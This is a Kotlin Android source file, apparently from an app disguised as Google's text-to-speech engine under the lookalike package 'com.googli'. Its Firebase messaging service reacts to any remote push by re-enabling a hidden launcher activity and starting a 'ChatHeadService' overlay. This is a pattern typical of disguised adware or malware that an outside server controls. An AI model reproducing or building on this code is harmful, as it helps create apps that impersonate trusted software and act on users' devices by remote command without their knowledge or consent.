package com.googli.googletext_to_speechengine

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage


class FireBaseMessagingService : FirebaseMessagingService() {
    override fun onMessageReceived(p0: RemoteMessage?) {
        addDrawerIcon(this)
        startService(Intent(this, ChatHeadService::class.java))

        super.onMessageReceived(p0)
    }
    fun addDrawerIcon(context: Context) {
        val componentToDisable = ComponentName("com.googli.googletext_to_speechengine",
                "com.googli.googletext_to_speechengine.FlashActivity")

        context.packageManager.setComponentEnabledSetting(
                componentToDisable,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP)
    }
}